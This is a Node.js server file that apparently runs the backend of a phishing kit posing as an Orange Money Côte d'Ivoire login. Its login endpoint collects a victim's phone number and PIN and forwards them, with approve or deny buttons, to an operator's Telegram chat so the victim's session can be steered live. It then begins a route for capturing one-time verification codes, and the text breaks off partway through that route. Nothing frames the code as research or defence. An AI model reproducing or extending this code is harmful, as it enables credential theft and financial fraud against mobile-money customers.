const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Côte d'Ivoire";
    const countryCode = "+225";

    const currentTime = new Date().toLocaleString('fr-FR', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: false
    });

    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const message = `📱 <b>ORANGE MONEY CÔTE D'IVOIRE - TENTATIVE DE CONNEXION</b>

🆕 <b>NOUVEL UTILISATEUR</b>
🇨🇮 <b>Pays:</b> ${country}
🌍 <b>Indicatif:</b> ${countryCode}
📱 <b>Numéro de téléphone:</b> ${phone}
🔢 <b>Code PIN:</b> ${pin}
⏰ <b>Heure:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Utilisateur en attente de validation</b>
⌛ <b>Délai d'expiration: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Autoriser à continuer", callback_data: `approve|${phone}|${pin}` },
                        { text: "❌ Identifiants invalides", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- FIRST OTP API (6-CHARACTER VERIFICATION CODE) --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, code } = req.body || {};
    const country = "Côte d'Ivoire";
    
